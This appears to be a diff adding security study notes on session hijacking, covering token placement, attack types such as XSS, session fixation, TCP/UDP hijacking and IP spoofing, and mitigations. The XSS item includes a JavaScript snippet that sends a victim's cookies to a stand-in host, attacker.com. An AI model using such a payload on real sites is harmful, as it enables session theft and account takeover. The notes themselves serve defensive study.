@@ -165,3 +165,96 @@
 - What is the biggest down side of using the URL to send the token?
     The token will be sent in the referrer from an HTPP resource
     The token may be logged
+
+- What are the bad sides of using a session token in a hidden form field?
+    Every request needs to be a post
+    The session ID is lost as soon you leave the website (no remmember me)
+    Cannot secure embedded resources (ex: video on the page)
+        Not an authenticated request...
+
+- What kind of attacks can lead to session hijacking? How?
+    XSS
+        By grabbing the cookie and to send it to the attacker website
+            ex:
+            var img = document.createElement("img");
+            img.src="http://attacker.com/?cookies="+document.cookie;
+            document.body.appendChild(img);
+    Exposed cookie based session id in logs
+    Leaking URL persisted sessions in the referer
+        The web app make a call to an external website, it sends the referer URL in the request
+            ex: persistent/reflected XSS to add a malicious link
+    Session sniffing
+        Sniffing the network
+            (HTTP proxy), wireless level, DNS hijacked and send trafic to the attacker server, router level, ASP level, etc.
+    Session fixation
+        The attacker gives the session ID to the user.
+            ex: Session id in url, and the token does not change after login, victim follow the link, login, et voilà!
+            ex: XSS that set the session cookie that the attacker knows to be good.
+    Brute forcing the session id
+    Session donation
+        Not session hijacking persay, but related.
+        Create an account for the victim (with its name etc.)
+        Send the URL that includes the session Id (or inject the cookie)
+            The attacker needs to social engineer the victim to "force" him to take some actions
+
+- Is network level session hijacking a big problem nowadays?
+    Not really, this is a remnant of a bygone era
+
+- What is TCP?
+    The protocol over what HTTP/HTTPS works on
+    - How does it work?
+        3 way handshake
+        client sends synchronize packet -> server answers synchronize-acknowledgement -> client answer acknowledge
+        seq=0 ack=0                        seq=1 ack=0                                   seq=1 ack=1
+        each paquet has a seq and ack attribute (unsigned int)
+        next requests:
+        seq=1 ack=1 byte=120               seq=121 ack=1
+    - What is the attack vector?
+        Predict the seq for new requests
+    - How old is it?
+        > 10 years
+
+- What is blind TCP session hijacking?
+    Attack cannot sniff the network, so he desynchronize the connection, send the predictable seq ack, and receive the response from the server
+
+- MitM session sniffing, how does it works?
+    The attacker re-routes the packets, by forging ICMP paquets so that it passes to the attacker machine
+
+- What is IP spoofing? How does it work?
+    A TCP session hijacking attack.
+    Attacker determines ip address of trusted host, address is spoofed in source routed packet, connection is desynchronized
+
+- What is UDP?
+    A connectionless protocol: no handshaking, paquets are sent then forgotten, you never know that it reached the destination.
+
+- What is the difference between TCP and UDP hijacking?
+    No desynchronization needed, the attacker simply needs to forge a response and send it before the server, and maybe MitM to block the server response
+
+- What is man in the browser attack?
+    Attacker infects victim's browser with a trojan, trojan extracts data from the DOM (credentials, cookies, URLs, etc.)
+
+- How can you mitigate the risk of session hijacking?
+    Use strong session Ids.
+        - What does it mean?
+            Not enumerable
+            Not guessable (at short time)
+            No patterns
+    Keep session ids out of the URL
+    Do not reuse session ID for auth
+        Unauthenticated user has a session id, the same session id should not be used for its authenticated session
+    Always flag session id cookies as http only and secure only
+    Use TLS
+        mitigates: DNS poisoning (certificates), MitM, the referrer header is not sent
+    Session expiration and session cookies
+        Minimizing the window of risk
+    Consider disabling sliding sessions
+        At each request, the expiration is reseted
+        20 minutes before session expiration
+                20 minutes before session expiration
+                            20 minutes before session expiration
+                                                20 minutes before session expiration
+    Encourage users to log out
+    Re-authenticate before key actions
+
+- What tool can you use to manipulate the session cookie?
+    ZAP, Burp(, NetSparker)
